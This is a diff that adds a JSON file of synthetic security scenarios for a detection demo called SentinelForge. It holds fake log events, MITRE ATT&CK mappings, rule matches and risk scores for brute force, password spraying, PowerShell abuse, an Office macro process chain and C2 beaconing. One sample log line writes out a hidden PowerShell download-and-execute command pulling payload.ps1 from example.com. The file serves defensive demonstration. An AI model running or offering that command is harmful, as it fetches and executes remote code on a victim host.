@@ -1,0 +1,295 @@
+{
+  "meta": {
+    "generated": "synthetic",
+    "labeled": "precomputed",
+    "description": "SentinelForge public demo \u2014 synthetic security scenarios only. No real logs, no local data access. Results are precomputed and deterministic, clearly labeled as such."
+  },
+  "scenarios": [
+    {
+      "id": "failed-login-burst",
+      "name": "Failed Login Burst",
+      "description": "Rapid authentication failures from a single source IP targeting multiple accounts \u2014 characteristic of brute-force activity.",
+      "mitre": "T1110.001 \u2014 Brute Force",
+      "severity": "High",
+      "rule": "FailedLoginBurstRule",
+      "sourceNote": "Precomputed synthetic result",
+      "events": [
+        {
+          "event_id": "evt-001",
+          "timestamp": "2026-01-15T03:12:01Z",
+          "event_type": "auth.login.failure",
+          "source_address": "203.0.113.45",
+          "target_address": "10.0.1.50",
+          "user": "admin",
+          "raw": "2026-01-15T03:12:01Z auth.login.failure src=203.0.113.45 dst=10.0.1.50 user=admin reason=invalid_password"
+        },
+        {
+          "event_id": "evt-002",
+          "timestamp": "2026-01-15T03:12:03Z",
+          "event_type": "auth.login.failure",
+          "source_address": "203.0.113.45",
+          "target_address": "10.0.1.50",
+          "user": "admin",
+          "raw": "2026-01-15T03:12:03Z auth.login.failure src=203.0.113.45 dst=10.0.1.50 user=admin reason=invalid_password"
+        },
+        {
+          "event_id": "evt-003",
+          "timestamp": "2026-01-15T03:12:05Z",
+          "event_type": "auth.login.failure",
+          "source_address": "203.0.113.45",
+          "target_address": "10.0.1.50",
+          "user": "root",
+          "raw": "2026-01-15T03:12:05Z auth.login.failure src=203.0.113.45 dst=10.0.1.50 user=root reason=invalid_password"
+        },
+        {
+          "event_id": "evt-004",
+          "timestamp": "2026-01-15T03:12:07Z",
+          "event_type": "auth.login.failure",
+          "source_address": "203.0.113.45",
+          "target_address": "10.0.1.50",
+          "user": "test",
+          "raw": "2026-01-15T03:12:07Z auth.login.failure src=203.0.113.45 dst=10.0.1.50 user=test reason=invalid_password"
+        },
+        {
+          "event_id": "evt-005",
+          "timestamp": "2026-01-15T03:12:09Z",
+          "event_type": "auth.login.failure",
+          "source_address": "203.0.113.45",
+          "target_address": "10.0.1.50",
+          "user": "guest",
+          "raw": "2026-01-15T03:12:09Z auth.login.failure src=203.0.113.45 dst=10.0.1.50 user=guest reason=invalid_password"
+        }
+      ],
+      "detection": {
+        "rule_id": "FailedLoginBurstRule",
+        "matched_events": [
+          "evt-001",
+          "evt-002",
+          "evt-003",
+          "evt-004",
+          "evt-005"
+        ],
+        "evidence_citation": "5 failed authentication events from 203.0.113.45 within 8 seconds, targeting 4 distinct accounts on 10.0.1.50",
+        "risk_score": 82,
+        "confidence": 0.88
+      }
+    },
+    {
+      "id": "password-spraying",
+      "name": "Password Spraying",
+      "description": "Authentication attempts across many accounts from a small set of source addresses \u2014 characteristic of password spraying.",
+      "mitre": "T1110.002 \u2014 Password Spraying",
+      "severity": "High",
+      "rule": "PasswordSprayRule",
+      "sourceNote": "Precomputed synthetic result",
+      "events": [
+        {
+          "event_id": "evt-101",
+          "timestamp": "2026-01-16T04:05:11Z",
+          "event_type": "auth.login.failure",
+          "source_address": "198.51.100.77",
+          "target_address": "10.0.1.100",
+          "user": "alice",
+          "raw": "2026-01-16T04:05:11Z auth.login.failure src=198.51.100.77 dst=10.0.1.100 user=alice reason=invalid_password"
+        },
+        {
+          "event_id": "evt-102",
+          "timestamp": "2026-01-16T04:05:15Z",
+          "event_type": "auth.login.failure",
+          "source_address": "198.51.100.77",
+          "target_address": "10.0.1.100",
+          "user": "bob",
+          "raw": "2026-01-16T04:05:15Z auth.login.failure src=198.51.100.77 dst=10.0.1.100 user=bob reason=invalid_password"
+        },
+        {
+          "event_id": "evt-103",
+          "timestamp": "2026-01-16T04:05:19Z",
+          "event_type": "auth.login.failure",
+          "source_address": "198.51.100.77",
+          "target_address": "10.0.1.100",
+          "user": "charlie",
+          "raw": "2026-01-16T04:05:19Z auth.login.failure src=198.51.100.77 dst=10.0.1.100 user=charlie reason=invalid_password"
+        },
+        {
+          "event_id": "evt-104",
+          "timestamp": "2026-01-16T04:05:23Z",
+          "event_type": "auth.login.failure",
+          "source_address": "198.51.100.77",
+          "target_address": "10.0.1.100",
+          "user": "diana",
+          "raw": "2026-01-16T04:05:23Z auth.login.failure src=198.51.100.77 dst=10.0.1.100 user=diana reason=invalid_password"
+        },
+        {
+          "event_id": "evt-105",
+          "timestamp": "2026-01-16T04:05:27Z",
+          "event_type": "auth.login.failure",
+          "source_address": "198.51.100.77",
+          "target_address": "10.0.1.100",
+          "user": "eve",
+          "raw": "2026-01-16T04:05:27Z auth.login.failure src=198.51.100.77 dst=10.0.1.100 user=eve reason=invalid_password"
+        }
+      ],
+      "detection": {
+        "rule_id": "PasswordSprayRule",
+        "matched_events": [
+          "evt-101",
+          "evt-102",
+          "evt-103",
+          "evt-104",
+          "evt-105"
+        ],
+        "evidence_citation": "5 failed authentication events from 198.51.100.77 targeting 5 distinct accounts with single password attempt per account",
+        "risk_score": 76,
+        "confidence": 0.81
+      }
+    },
+    {
+      "id": "suspicious-powershell",
+      "name": "Suspicious PowerShell Execution",
+      "description": "PowerShell execution with encoded commands and execution bypass flags \u2014 common in living-off-the-land attacks.",
+      "mitre": "T1059.001 \u2014 PowerShell",
+      "severity": "Medium",
+      "rule": "SuspiciousPowerShellRule",
+      "sourceNote": "Precomputed synthetic result",
+      "events": [
+        {
+          "event_id": "evt-201",
+          "timestamp": "2026-01-17T09:22:33Z",
+          "event_type": "process.create",
+          "source_address": null,
+          "target_address": "10.0.1.200",
+          "user": "svc_deploy",
+          "raw": "2026-01-17T09:22:33Z process.create user=svc_deploy host=10.0.1.200 cmd=powershell.exe -EncodedCommand SQBuAHQAbwByAHQALQBFAGYAZgBlAGMAdAAgAEYAbwByAGQAZQByAGcAGUA"
+        },
+        {
+          "event_id": "evt-202",
+          "timestamp": "2026-01-17T09:22:35Z",
+          "event_type": "process.create",
+          "source_address": null,
+          "target_address": "10.0.1.200",
+          "user": "svc_deploy",
+          "raw": "2026-01-17T09:22:35Z process.create user=svc_deploy host=10.0.1.200 cmd=powershell.exe -ExecutionPolicy Bypass -File C:\\\\Temp\\\\update.ps1"
+        }
+      ],
+      "detection": {
+        "rule_id": "SuspiciousPowerShellRule",
+        "matched_events": [
+          "evt-201",
+          "evt-202"
+        ],
+        "evidence_citation": "2 PowerShell process creation events with -EncodedCommand and -ExecutionPolicy Bypass flags from svc_deploy on 10.0.1.200",
+        "risk_score": 54,
+        "confidence": 0.72
+      }
+    },
+    {
+      "id": "suspicious-processtree",
+      "name": "Suspicious Process Tree",
+      "description": "Unusual parent-child process relationship \u2014 Microsoft Word spawning cmd.exe, a common macro-based initial access pattern.",
+      "mitre": "T1059 \u2014 Command and Scripting Interpreter",
+      "severity": "Medium",
+      "rule": "SuspiciousProcessTreeRule",
+      "sourceNote": "Precomputed synthetic result",
+      "events": [
+        {
+          "event_id": "evt-301",
+          "timestamp": "2026-01-18T14:45:02Z",
+          "event_type": "process.create",
+          "source_address": null,
+          "target_address": "10.0.1.75",
+          "user": "jdoe",
+          "raw": "2026-01-18T14:45:02Z process.create parent=WINWORD.EXE pid=4812 cmd=cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1') user=jdoe host=10.0.1.75"
+        },
+        {
+          "event_id": "evt-302",
+          "timestamp": "2026-01-18T14:45:04Z",
+          "event_type": "process.create",
+          "source_address": null,
+          "target_address": "10.0.1.75",
+          "user": "jdoe",
+          "raw": "2026-01-18T14:45:04Z process.create parent=cmd.exe pid=4812 child=powershell.exe pid=5120 user=jdoe host=10.0.1.75"
+        }
+      ],
+      "detection": {
+        "rule_id": "SuspiciousProcessTreeRule",
+        "matched_events": [
+          "evt-301",
+          "evt-302"
+        ],
+        "evidence_citation": "WINWORD.EXE (PID 4812) spawned cmd.exe which spawned powershell.exe \u2014 unusual Office macro process chain on 10.0.1.75",
+        "risk_score": 61,
+        "confidence": 0.79
+      }
+    },
+    {
+      "id": "c2-beacon",
+      "name": "C2-Beacon-like Traffic",
+      "description": "Periodic outbound network connections at regular intervals \u2014 characteristic of command-and-control beaconing.",
+      "mitre": "T1071 \u2014 Application Layer Protocol",
+      "severity": "Medium",
+      "rule": "C2BeaconRule",
+      "sourceNote": "Precomputed synthetic result",
+      "events": [
+        {
+          "event_id": "evt-401",
+          "timestamp": "2026-01-19T11:00:00Z",
+          "event_type": "network.connection",
+          "source_address": "10.0.1.90",
+          "target_address": "example.com",
+          "user": null,
+          "raw": "2026-01-19T11:00:00Z network.connection src=10.0.1.90 dst=example.com port=443 proto=TCP bytes_in=124 bytes_out=310"
+        },
+        {
+          "event_id": "evt-402",
+          "timestamp": "2026-01-19T11:05:00Z",
+          "event_type": "network.connection",
+          "source_address": "10.0.1.90",
+          "target_address": "example.com",
+          "user": null,
+          "raw": "2026-01-19T11:05:00Z network.connection src=10.0.1.90 dst=example.com port=443 proto=TCP bytes_in=124 bytes_out=310"
+        },
+        {
+          "event_id": "evt-403",
+          "timestamp": "2026-01-19T11:10:00Z",
+          "event_type": "network.connection",
+          "source_address": "10.0.1.90",
+          "target_address": "example.com",
+          "user": null,
+          "raw": "2026-01-19T11:10:00Z network.connection src=10.0.1.90 dst=example.com port=443 proto=TCP bytes_in=124 bytes_out=310"
+        },
+        {
+          "event_id": "evt-404",
+          "timestamp": "2026-01-19T11:15:00Z",
+          "event_type": "network.connection",
+          "source_address": "10.0.1.90",
+          "target_address": "example.com",
+          "user": null,
+          "raw": "2026-01-19T11:15:00Z network.connection src=10.0.1.90 dst=example.com port=443 proto=TCP bytes_in=124 bytes_out=310"
+        },
+        {
+          "event_id": "evt-405",
+          "timestamp": "2026-01-19T11:20:00Z",
+          "event_type": "network.connection",
+          "source_address": "10.0.1.90",
+          "target_address": "example.com",
+          "user": null,
+          "raw": "2026-01-19T11:20:00Z network.connection src=10.0.1.90 dst=example.com port=443 proto=TCP bytes_in=124 bytes_out=310"
+        }
+      ],
+      "detection": {
+        "rule_id": "C2BeaconRule",
+        "matched_events": [
+          "evt-401",
+          "evt-402",
+          "evt-403",
+          "evt-404",
+          "evt-405"
+        ],
+        "evidence_citation": "5 periodic connections from 10.0.1.90 to example.com:443 at exactly 5-minute intervals with identical byte counts",
+        "risk_score": 48,
+        "confidence": 0.63,
+        "note": "Benign periodic HTTPS traffic may produce similar patterns \u2014 review destination reputation before escalating"
+      }
+    }
+  ]
+}
